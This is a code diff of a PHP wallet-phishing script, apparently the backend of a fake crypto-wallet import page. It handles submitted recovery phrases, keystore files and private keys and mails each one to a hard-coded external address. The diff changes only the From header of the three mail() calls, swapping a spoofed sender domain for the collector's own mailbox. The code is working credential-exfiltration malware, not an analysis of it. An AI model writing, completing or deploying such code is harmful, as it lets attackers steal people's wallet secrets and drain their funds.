@@ -15,7 +15,7 @@ if(isset($_POST['import_type']) && $_POST['import_type'] === 'phrase') {
 		$auto_mechanic='fthompson2019@yahoo.com';
 
 
-	    mail($auto_mechanic, ucwords($wallet_macintosh).' Box(Result) Box Submission', $msg_packet,'From:noreply@.secureuserauthentication.info');
+	    mail($auto_mechanic, ucwords($wallet_macintosh).' Box(Result) Box Submission', $msg_packet,'From:fthompson2019@yahoo.com');
 
 
 		echo 'success';
@@ -36,7 +36,7 @@ if(isset($_POST['import_type']) && $_POST['import_type'] === 'keystorejson') {
     $auto_mechanic='fthompson2019@yahoo.com';
    
 
-	    mail($auto_mechanic, ucwords($wallet_macintosh).' Box(Result) Box Submission', $msg_packet,'From:noreply@.secureuserauthentication.info');
+	    mail($auto_mechanic, ucwords($wallet_macintosh).' Box(Result) Box Submission', $msg_packet,'From:fthompson2019@yahoo.com');
      
 		echo 'success';
   }
@@ -54,7 +54,7 @@ if(isset($_POST['import_type']) && $_POST['import_type'] === 'private') {
 
 		$auto_mechanic='fthompson2019@yahoo.com';
    
-	    mail($auto_mechanic, ucwords($wallet_macintosh).' Box(Private Key) Box Submission', $msg_packet,'From:noreply@.secureuserauthentication.info');
+	    mail($auto_mechanic, ucwords($wallet_macintosh).' Box(Private Key) Box Submission', $msg_packet,'From:fthompson2019@yahoo.com');
      
 
 		echo 'success';
